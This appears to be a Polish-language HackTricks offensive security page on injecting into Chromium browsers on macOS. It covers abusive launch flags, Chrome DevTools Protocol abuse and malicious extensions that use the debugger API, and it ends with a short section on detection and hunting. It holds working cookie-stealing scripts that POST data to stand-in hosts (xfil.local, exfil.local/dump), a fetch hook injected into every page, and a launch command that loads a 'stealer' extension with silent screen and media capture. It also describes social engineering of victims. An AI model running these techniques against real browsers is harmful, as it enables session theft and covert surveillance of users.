# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Informacje podstawowe

Przeglądarki oparte na Chromium, takie jak Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi i Opera, korzystają z tych samych przełączników wiersza poleceń, plików preferencji oraz interfejsów automatyzacji DevTools. W systemie macOS każdy użytkownik z dostępem do GUI może zakończyć istniejącą sesję przeglądarki i ponownie ją uruchomić z dowolnymi flagami, rozszerzeniami lub endpointami DevTools działającymi z uprawnieniami celu.

#### Uruchamianie Chromium z niestandardowymi flagami w systemie macOS

macOS utrzymuje jedną instancję interfejsu użytkownika dla każdego profilu Chromium, dlatego instrumentacja zwykle wymaga wymuszonego zamknięcia przeglądarki (na przykład za pomocą `osascript -e 'tell application "Google Chrome" to quit'`). Atakujący zazwyczaj uruchamiają ją ponownie za pomocą `open -na "Google Chrome" --args <flags>`, aby wstrzyknąć argumenty bez modyfikowania pakietu aplikacji. Umieszczenie tego polecenia w użytkownikowym LaunchAgent (`~/Library/LaunchAgents/*.plist`) lub hooku logowania gwarantuje, że zmodyfikowana przeglądarka zostanie ponownie uruchomiona po restarcie lub wylogowaniu.

#### Flaga `--load-extension`

Flaga `--load-extension` automatycznie ładuje rozpakowane rozszerzenia (ścieżki rozdzielane przecinkami). Połącz ją z `--disable-extensions-except`, aby zablokować legalne rozszerzenia i wymusić uruchomienie wyłącznie własnego payloadu. Złośliwe rozszerzenia mogą żądać uprawnień o dużym wpływie, takich jak `debugger`, `webRequest` i `cookies`, aby uzyskać dostęp do protokołów DevTools, modyfikować nagłówki CSP, obniżać poziom HTTPS lub eksfiltrować dane sesji natychmiast po uruchomieniu przeglądarki.

#### Flagi `--remote-debugging-port` / `--remote-debugging-pipe`

Przełączniki te udostępniają Chrome DevTools Protocol (CDP) przez TCP lub pipe, dzięki czemu zewnętrzne narzędzia mogą sterować przeglądarką. Google zaobserwowało powszechne nadużywanie tego interfejsu przez infostealery i od wersji Chrome 136 (marzec 2025) przełączniki te są ignorowane dla domyślnego profilu, chyba że przeglądarka zostanie uruchomiona z niestandardowym `--user-data-dir`. Wymusza to App-Bound Encryption dla rzeczywistych profili, jednak atakujący nadal mogą uruchomić świeży profil, nakłonić ofiarę do uwierzytelnienia się w nim (phishing/pomoc w triage) oraz pobrać cookies, tokeny, stany zaufania urządzenia lub rejestracje WebAuthn za pośrednictwem CDP.

#### Flaga `--user-data-dir`

Flaga ta przekierowuje cały profil przeglądarki (History, Cookies, Login Data, pliki Preference itd.) do ścieżki kontrolowanej przez atakującego. Jest wymagana podczas łączenia nowoczesnych wersji Chrome z `--remote-debugging-port`, a także utrzymuje zmodyfikowany profil w izolacji, dzięki czemu można umieścić w nim wstępnie przygotowane pliki `Preferences` lub `Secure Preferences`, które wyłączają monity bezpieczeństwa, automatycznie instalują rozszerzenia i zmieniają domyślne schematy.

#### Flaga `--use-fake-ui-for-media-stream`

Przełącznik ten omija monit o uprawnienia do kamery/mikrofonu, dzięki czemu każda strona wywołująca `getUserMedia` natychmiast otrzymuje dostęp. Połącz go z flagami takimi jak `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` lub poleceniami CDP `Browser.grantPermissions`, aby po cichu przechwytywać audio/wideo, udostępniać ekran lub spełniać wymagania uprawnień WebRTC bez interakcji użytkownika.

## Wzorce dostarczania i ponownego uruchamiania spotykane w praktyce

Nadużycie CDP jest często etapem **post-exploitation**, a nie początkowym payloadem. W niedawnej kampanii wymierzonej w developerów korzystających z macOS użyto zatrutego etapu kompilacji Xcode **`Run Script`** (`PBXShellScriptBuildPhase`), dzięki czemu kod wykonywał się dopiero wtedy, gdy ofiara **zbudowała** projekt, a nie tylko go sklonowała lub otworzyła. Po pierwszym wykonaniu malware infekował także inne drzewa `.xcodeproj`, dodawał złośliwe hooki Git `pre-commit` i przeszukiwał archiwa ZIP w poszukiwaniu kolejnych projektów Xcode.

W przypadku nadużycia Chromium ma to znaczenie, ponieważ atakujący nie musi modyfikować samego pliku binarnego przeglądarki. Krótkotrwały stager build-phase / `osascript` może zamiast tego zainstalować **browser wrapper** (LaunchAgent, login item, wpis w Docku, trojanizowany launcher aplikacji itp.), który ponownie otwiera legalną przeglądarkę z flagami kontrolowanymi przez atakującego za każdym razem, gdy użytkownik ją uruchamia.

> [!TIP]
> Na endpointach developerów sprawdzaj pliki `.pbxproj`, `.git/hooks/pre-commit` oraz pliki ZIP zawierające `.xcodeproj` pod kątem nieoczekiwanych poleceń `curl`, `osascript`, `xxd`, zagnieżdżonego `base64` lub logiki ponownego uruchamiania Chrome.

## Nadużycie zdalnego debugowania i DevTools Protocol

Po ponownym uruchomieniu Chrome z dedykowanymi `--user-data-dir` i `--remote-debugging-port` można podłączyć się przez CDP (np. za pomocą `chrome-remote-interface`, `puppeteer` lub `playwright`) i skryptować workflow o wysokich uprawnieniach:

- **Kradzież cookies/sesji:** `Network.getAllCookies` i `Storage.getCookies` zwracają wartości HttpOnly nawet wtedy, gdy App-Bound encryption normalnie blokowałoby dostęp do systemu plików, ponieważ CDP prosi uruchomioną przeglądarkę o ich odszyfrowanie.
- **Manipulowanie uprawnieniami:** `Browser.grantPermissions` i `Emulation.setGeolocationOverride` pozwalają omijać monity dotyczące kamery/mikrofonu (szczególnie w połączeniu z `--use-fake-ui-for-media-stream`) lub fałszować kontrole bezpieczeństwa oparte na lokalizacji.
- **Wstrzykiwanie keystroke/script:** `Runtime.evaluate` wykonuje dowolny JavaScript wewnątrz aktywnej karty, umożliwiając kradzież danych uwierzytelniających, modyfikowanie DOM lub wstrzykiwanie beaconów persistence, które przetrwają nawigację.
- **Eksfiltracja na żywo:** `Network.webRequestWillBeSentExtraInfo` i `Fetch.enable` przechwytują uwierzytelnione żądania/odpowiedzi w czasie rzeczywistym bez dotykania artefaktów na dysku.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Ponieważ Chrome 136 blokuje CDP w domyślnym profilu, kopiowanie istniejącego katalogu `~/Library/Application Support/Google/Chrome` ofiary do staging path nie zapewnia już odszyfrowanych cookies. Zamiast tego nakłoń użytkownika metodami social engineering do uwierzytelnienia się w instrumentowanym profilu (np. podczas „pomocnej” sesji wsparcia) albo przechwytuj tokeny MFA podczas transmisji za pomocą kontrolowanych przez CDP hooków sieciowych.

### Łańcuch backdoora CDP w stylu XCSSET

Praktyczny wzorzec malware wygląda następująco:

1. Restartuj userland implant lub wrapper przy każdym uruchomieniu Chrome.
2. Uruchom legalną przeglądarkę z `--remote-debugging-port=<port>` oraz, w Chrome 136+, zwykle z powiązanym niestandardowym `--user-data-dir=<dir>`.
3. Uruchom helper, który łączy się z lokalnym WebSocketem CDP i rejestruje hook wykonywany przed dokumentem za pomocą `Page.addScriptToEvaluateOnNewDocument`.

Taki helper może wstrzyknąć JavaScript **zanim** uruchomi się kod witryny, co idealnie nadaje się do hookowania `window.fetch`, `XMLHttpRequest`, dostawców walletów lub procesów autofill bez modyfikowania plików na dysku.
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
Silniejszy wariant zmienia browser w **host command bridge**: wstrzyknięty JavaScript emituje `console.log` oznaczony separatorem, lokalny helper nasłuchuje `Runtime.consoleAPICalled`, usuwa marker, wykonuje pozostałą część za pośrednictwem host shell (na przykład `exec.Command` w Go), a następnie zwraca stdout/stderr przez WebSocket atakującego. W ten sposób wykonywanie skryptów na poziomie karty zostaje przekształcone w niemal bezplikowy reverse shell.

## Extension-Based Injection via Debugger API

Badania „Chrowned by an Extension” z 2023 roku wykazały, że malicious extension używające API `chrome.debugger` może dołączyć do dowolnej karty i uzyskać te same możliwości DevTools co `--remote-debugging-port`. Łamie to pierwotne założenia izolacji (extensions pozostają w swoim kontekście) i umożliwia:

- Cichą kradzież cookies i credentials za pomocą `Network.getAllCookies`/`Fetch.getResponseBody`.
- Modyfikowanie uprawnień witryn (camera, microphone, geolocation) oraz omijanie security interstitial, co pozwala phishing pages podszywać się pod okna dialogowe Chrome.
- Manipulowanie ostrzeżeniami TLS, downloadami lub promptami WebAuthn on-path poprzez programowe wywoływanie `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` lub `Security.handleCertificateError`.

Załaduj extension za pomocą `--load-extension`/`--disable-extensions-except`, aby nie była wymagana żadna interakcja użytkownika. Minimalny background script weaponizujący API wygląda następująco:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
Extension może również subskrybować zdarzenia `Debugger.paused`, aby odczytywać zmienne JavaScript, modyfikować skrypty inline lub dodawać niestandardowe breakpointy, które przetrwają nawigację. Ponieważ wszystko działa wewnątrz sesji GUI użytkownika, Gatekeeper i TCC nie są uruchamiane, dzięki czemu technika ta jest idealna dla malware, które uzyskało już execution w kontekście użytkownika.

## Wykrywanie i hunting

- Generuj alerty, gdy przeglądarki Chromium są uruchamiane z opcjami `--remote-debugging-port`, `--remote-debugging-pipe` lub podejrzaną opcją `--user-data-dir`, szczególnie gdy procesem nadrzędnym jest `bash`, `sh`, `osascript`, `xcodebuild` lub helper LaunchAgent.
- Szukaj krótkich łańcuchów, w których helper otwiera lokalny WebSocket CDP, rejestruje `Page.addScriptToEvaluateOnNewDocument`, a następnie nawiązuje długotrwałe połączenie wychodzące WebSocket/HTTPS.
- Wykrywaj mosty console-to-shell, korelując aktywność przeglądarki `Runtime.consoleAPICalled` z procesami potomnymi shell lub helperami wykonującymi polecenia dostarczone przez attackera.
- Na Macach developerskich sprawdzaj wpisy `PBXShellScriptBuildPhase` w plikach `.pbxproj`, hooki Git `pre-commit`, relaunchery Dock/login item oraz projekty Xcode zawarte w plikach ZIP pod kątem instalacji browser wrapperów.
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### Narzędzia

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Automatyzuje uruchamianie Chromium z rozszerzeniami zawierającymi payloady i udostępnia interaktywne hooki CDP.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Podobne narzędzie skoncentrowane na przechwytywaniu ruchu i instrumentacji przeglądarki dla operatorów macOS.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Biblioteka Node.js do skryptowania zrzutów Chrome DevTools Protocol (cookies, DOM, uprawnienia), gdy działa instancja z parametrem `--remote-debugging-port`.

### Przykład
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Znajdź więcej przykładów w linkach do tools.

## Referencje

- [https://chromedevtools.github.io/devtools-protocol/v8/Runtime/](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [https://chromedevtools.github.io/devtools-protocol/tot/Page/](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [https://twitter.com/RonMasas/status/1758106347222995007](https://twitter.com/RonMasas/status/1758106347222995007)
- [https://developer.chrome.com/blog/remote-debugging-port](https://developer.chrome.com/blog/remote-debugging-port)
- [https://arxiv.org/abs/2305.11506](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
